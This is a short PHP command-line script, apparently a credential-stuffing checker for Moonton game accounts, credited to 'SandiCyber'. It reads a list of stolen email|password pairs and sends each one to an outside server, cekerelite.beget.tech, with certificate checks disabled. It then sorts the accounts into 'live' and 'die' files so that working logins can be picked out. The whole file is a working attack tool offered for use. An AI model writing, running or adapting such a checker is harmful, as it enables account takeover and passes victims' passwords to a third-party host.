<?php
error_reporting(0);
function curl($url, $fields = null, $headers = null)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	if ($fields !== null) {
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
	}
	if ($headers !== null) {
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	}
	curl_setopt($ch, CURLOPT_HEADER, true);
	$result   = curl_exec($ch);
	$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);

	return $result;
}

function save($fileName,$line) {
    $file = fopen($fileName, 'a');
    fwrite($file, $line ."\n");
    fclose($file);
}

$i = 0;
$live = 0;
$die = 0;
$listcode = $argv[1];
if (empty($argv[1])){
	die("Masukan empas dengan cara php run.php empas.txt\n");
}else{

echo "CHECKER ACCOUNT MOONTON | Code by SandiCyber\n";

}
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
echo "Total : ".$count ." Empas \n";
while($i < $count) {
	$em = explode("|", $code[$i]);
	$email = $em[0];
	$pass = $em[1];
	$login = curl('http://cekerelite.beget.tech/api.php?e='.$email.'&p='.$pass.'',$header);
	if(preg_match('/{"STATUS":"DIE"}/', $login)){

		echo "[ ".$i."/".$count." ] [  DIE ] Email : ".$email." | Password : ".$pass." [ ACC MOONTON ]\n";
		save('die.txt',$email."|".$pass);
		$die +=1;

	}else{
		echo $simpan = "[ ".$i."/".$count." ] [ LIVE ] Email : ".$email." | Password : ".$pass." [ ACC MOONTON ]\n";
		$live +=1;
		save('live.txt',$email."|".$pass);
	}
	$i++;

}

echo "\nReport : ACC LIVE : ".$live." & ACC DIE : ".$die." \n";
